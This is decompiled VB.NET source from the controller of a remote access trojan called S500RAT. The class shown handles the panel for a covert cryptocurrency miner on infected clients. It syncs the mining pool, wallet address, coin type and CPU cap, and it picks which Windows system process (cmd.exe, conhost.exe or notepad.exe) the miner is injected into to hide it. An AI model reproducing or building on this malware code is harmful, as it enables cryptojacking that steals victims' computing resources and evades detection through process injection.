Imports System
Imports System.Drawing
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000062 RID: 98
	Public Class FrmXMR
		' Token: 0x060011C2 RID: 4546 RVA: 0x0009E548 File Offset: 0x0009C748
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim formXMR As FormXMR = CType(Application.OpenForms("FormXMR" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormXMR)
				Dim flag As Boolean = formXMR IsNot Nothing
				If flag Then
					Dim flag2 As Boolean = formXMR.Client Is Nothing
					If flag2 Then
						formXMR.Client = client
						formXMR.Timer1.Enabled = True
						formXMR.Power.Enabled = True
					End If
					Dim flag3 As Boolean = Conversions.ToBoolean(unpack_msgpack.ForcePathObject("Running").AsString)
					Dim flag4 As Boolean = flag3
					If flag4 Then
						formXMR.Power.Enabled = True
						formXMR.Power.FillColor = Color.FromArgb(211, 57, 87)
						formXMR.Power.FillColor2 = Color.FromArgb(211, 57, 87)
						formXMR.GroupCoin.Enabled = False
						formXMR.GroupConfig.Enabled = False
						formXMR.PanelCPUmax.Enabled = False
						formXMR.MiningWalletAddress.Enabled = False
						formXMR.MiningWorkName.Enabled = False
						formXMR.MiningPool.Enabled = False
						formXMR.Power.Text = "Stop"
					Else
						formXMR.Power.Enabled = True
						formXMR.Power.FillColor = Color.FromArgb(26, 155, 161)
						formXMR.Power.FillColor2 = Color.FromArgb(26, 155, 161)
						formXMR.GroupCoin.Enabled = True
						formXMR.GroupConfig.Enabled = True
						formXMR.PanelCPUmax.Enabled = True
						formXMR.MiningWalletAddress.Enabled = True
						formXMR.MiningWorkName.Enabled = True
						formXMR.MiningPool.Enabled = True
						formXMR.Power.Text = "Start"
					End If
					Dim asString As String = unpack_msgpack.ForcePathObject("Pool").AsString
					Dim asString2 As String = unpack_msgpack.ForcePathObject("Coin").AsString
					Dim asString3 As String = unpack_msgpack.ForcePathObject("Wallet").AsString
					Dim asString4 As String = unpack_msgpack.ForcePathObject("WorkName").AsString
					Dim asString5 As String = unpack_msgpack.ForcePathObject("CPUMax").AsString
					Dim asString6 As String = unpack_msgpack.ForcePathObject("Inject").AsString
					Try
						formXMR.MiningPool.Text = asString
						Dim flag5 As Boolean = Operators.CompareString(asString2, "BTC", False) = 0
						If flag5 Then
							formXMR.ConBTC.Checked = True
						Else
							Dim flag6 As Boolean = Operators.CompareString(asString2, "ETH", False) = 0
							If flag6 Then
								formXMR.ConETH.Checked = True
							Else
								Dim flag7 As Boolean = Operators.CompareString(asString2, "LSK", False) = 0
								If flag7 Then
									formXMR.ConLSK.Checked = True
								Else
									Dim flag8 As Boolean = Operators.CompareString(asString2, "DOGE", False) = 0
									If flag8 Then
										formXMR.ConDOGE.Checked = True
									Else
										Dim flag9 As Boolean = Operators.CompareString(asString2, "XMR", False) = 0
										If flag9 Then
											formXMR.ConXMR.Checked = True
										End If
									End If
								End If
							End If
						End If
						formXMR.MiningWalletAddress.Text = asString3
						formXMR.MiningWorkName.Text = asString4
						formXMR.MiningMAX.Value = Conversions.ToInteger(asString5)
						formXMR.MiningNumMax.Text = Conversions.ToString(formXMR.MiningMAX.Value) + "%"
						Dim right As String = "C:\Windows\System32\cmd.exe"
						Dim right2 As String = "C:\Windows\System32\conhost.exe"
						Dim right3 As String = "C:\Windows\System32\notepad.exe"
						Dim flag10 As Boolean = Operators.CompareString(asString6, right, False) = 0
						If flag10 Then
							formXMR.InjectCmd.Checked = True
						Else
							Dim flag11 As Boolean = Operators.CompareString(asString6, right2, False) = 0
							If flag11 Then
								formXMR.InjectConhost.Checked = True
							Else
								Dim flag12 As Boolean = Operators.CompareString(asString6, right3, False) = 0
								If flag12 Then
									formXMR.InjectNotepad.Checked = True
								Else
									formXMR.InjectCmd.Checked = True
								End If
							End If
						End If
					Catch ex As Exception
					End Try
				End If
			Catch ex2 As Exception
			End Try
		End Sub
	End Class
End Namespace
